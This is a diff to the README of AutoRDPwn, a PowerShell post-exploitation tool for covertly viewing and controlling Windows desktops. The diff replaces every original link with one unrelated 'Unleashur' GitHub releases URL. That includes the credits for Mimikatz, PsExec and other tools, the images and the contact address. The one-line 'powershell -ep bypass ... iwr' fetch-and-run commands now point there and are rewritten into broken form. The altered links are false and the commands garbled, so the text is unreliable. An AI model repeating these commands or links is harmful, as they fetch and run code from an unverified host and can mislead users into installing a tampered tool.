@@ -1,4 +1,4 @@
-<p align="center"><img width=450 alt="AutoRDPwn" src="https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.png"></p>
+<p align="center"><img width=450 alt="AutoRDPwn" src="https://github.com/Unleashur/AutoRDPwn/releases"></p>
 
 **AutoRDPwn** is a post-exploitation framework created in Powershell, designed primarily to automate the **Shadow** attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.
 
@@ -53,23 +53,23 @@ When used remotely in a reverse shell, it is necessary to use the following para
 
 **Local execution on one line:**
 ```
-powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"
+powershell -ep bypass "cd $env:temp ; iwr https://github.com/Unleashur/AutoRDPwn/releases -outfile https://github.com/Unleashur/AutoRDPwn/releases ; .\https://github.com/Unleashur/AutoRDPwn/releases"
 ```
 
 **Example of remote execution on a line:**
 ```
-powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -admin -nogui -lang English -option 4 -shadow control -createuser"
+powershell -ep bypass "cd $env:temp ; iwr https://github.com/Unleashur/AutoRDPwn/releases -outfile https://github.com/Unleashur/AutoRDPwn/releases ; .\https://github.com/Unleashur/AutoRDPwn/releases -admin -nogui -lang English -option 4 -shadow control -createuser"
 ```
 
 
 ### The detailed guide of use can be found at the following link:
 
-https://darkbyte.net/autordpwn-la-guia-definitiva
+https://github.com/Unleashur/AutoRDPwn/releases
 
 
 # Screenshots
-![AutoRDPwn1_en](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn1_en.PNG)
-![AutoRDPwn2_en](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn2_en.PNG)
+![AutoRDPwn1_en](https://github.com/Unleashur/AutoRDPwn/releases)
+![AutoRDPwn2_en](https://github.com/Unleashur/AutoRDPwn/releases)
 
 
 # License
@@ -81,21 +81,21 @@ This framework has been created and designed from scratch by Joel Gámez Molina 
 
 Some modules use third-party code, scripts, and tools, particularly:
 
-• **Chachi-Enumerator** by *Luis Vacas* --> https://github.com/Hackplayers/PsCabesha-tools
+• **Chachi-Enumerator** by *Luis Vacas* --> https://github.com/Unleashur/AutoRDPwn/releases
 
-• **Invoke-Phant0m** by *Halil Dalabasmaz* --> https://github.com/hlldz/Invoke-Phant0m
+• **Invoke-Phant0m** by *Halil Dalabasmaz* --> https://github.com/Unleashur/AutoRDPwn/releases
 
-• **Invoke-PowerShellTcp** by *Nikhil "SamratAshok" Mittal* --> https://github.com/samratashok/nishang
+• **Invoke-PowerShellTcp** by *Nikhil "SamratAshok" Mittal* --> https://github.com/Unleashur/AutoRDPwn/releases
 
-• **Invoke-TheHash** by *Kevin Robertson* --> https://github.com/Kevin-Robertson/Invoke-TheHash
+• **Invoke-TheHash** by *Kevin Robertson* --> https://github.com/Unleashur/AutoRDPwn/releases
 
-• **Mimikatz** by *Benjamin Delpy* --> https://github.com/gentilkiwi/mimikatz
+• **Mimikatz** by *Benjamin Delpy* --> https://github.com/Unleashur/AutoRDPwn/releases
 
-• **PsExec** by *Mark Russinovich* --> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+• **PsExec** by *Mark Russinovich* --> https://github.com/Unleashur/AutoRDPwn/releases
 
-• **RDP Wrapper** by *Stas'M Corp.* --> https://github.com/stascorp/rdpwrap
+• **RDP Wrapper** by *Stas'M Corp.* --> https://github.com/Unleashur/AutoRDPwn/releases
 
-• **SharpRDP** by *Steven F* --> https://github.com/0xthirteen/SharpRDP
+• **SharpRDP** by *Steven F* --> https://github.com/Unleashur/AutoRDPwn/releases
 
 And many more, that do not fit here.. Thanks to all of them and their excellent work.
 
@@ -103,10 +103,10 @@ And many more, that do not fit here.. Thanks to all of them and their excellent 
 # Contact
 This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.
 
-For more information, you can contact through info@darkbyte.net
+For more information, you can contact through https://github.com/Unleashur/AutoRDPwn/releases
 
 
 # Support
 You can support my work buying me a coffee:
 
-[<img width=250 alt="buymeacoffe" src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png">](https://www.buymeacoffee.com/joelgmsec)
+[<img width=250 alt="buymeacoffe" src="https://github.com/Unleashur/AutoRDPwn/releases">](https://github.com/Unleashur/AutoRDPwn/releases)
